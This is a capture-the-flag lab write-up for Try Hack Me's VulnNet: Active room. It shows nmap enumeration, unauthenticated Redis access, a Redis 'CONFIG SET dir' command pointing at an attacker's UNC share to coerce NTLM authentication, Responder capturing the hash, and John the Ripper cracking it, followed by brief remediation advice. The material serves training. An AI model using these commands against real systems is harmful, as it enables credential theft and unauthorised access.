# Try Hack Me - VulnNet: Active

**OWASP Category: A05:2025 Security Misconfiguration**

popisek shrnutí

## Tools:
- **Nmap**
- **Responder**
- **redis-tools**
- **John The Ripper**

## Methodology:

1. **Enumerating target with Nmap**
    - Nmap scan:
    
    ```bash
    nmap -A 10.112.167.20
    ```

     <img src="\assets\VulnNet_nmap.png" alt="nmap_reuslts" width="1000px">

    - The open fort 464 (Kerberos-password change requests) signals, that the target is a Domain Controller. 
    - There is a legacy version of Redis running on port 6379 (Redis key-value store 2.8.2402). The legacy version often lacks authentication.

2. **Connecting to Redis without authentication**
    - I tried to if I can connect to the Redis service running without authentication and I was successful.

     <img src="\assets\VulnNet_Redis.png" alt="redis_authentication" width="1000px">

3. **Getting Redis NTLMv2 hash**
    - Running Responder and then forcing Redis to authenticate to a non-existent directory, NTLMv2 hash of the Redis service account was captured.

    - In Redis command line:
    ```bash
    > CONFIG SET dir \\192.168.166.244\folder\
    ```

    <img src="\assets\VulnNet_redis_dir.png" alt="Redis_fake_dir" width="1000px">

    - Running responder on Kali Linux:
    ```bash
    sudo responder -I tun0 -dwv
    ```

    - Captured NTLMv2 hash of account "enterprise-security":

    <img src="\assets\VulnNet_NTLMv2.png" alt="NTLMv2_hash" width="1000px">

4. **Cracking the hash**
    - Using John The Ripper I cracked the NTLMv2 hash.

    ```bash
    john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash_vulnnet.txt
    ```

    <img src="\assets\VulnNet_cracked.png" alt="cracked_hash" width="1000px">

## Remediation:
    Upgrade Redis version to a patched version. Regularly perform vulnerability scanning to discover unpatched vulnerabilities. Enforce strong password policy.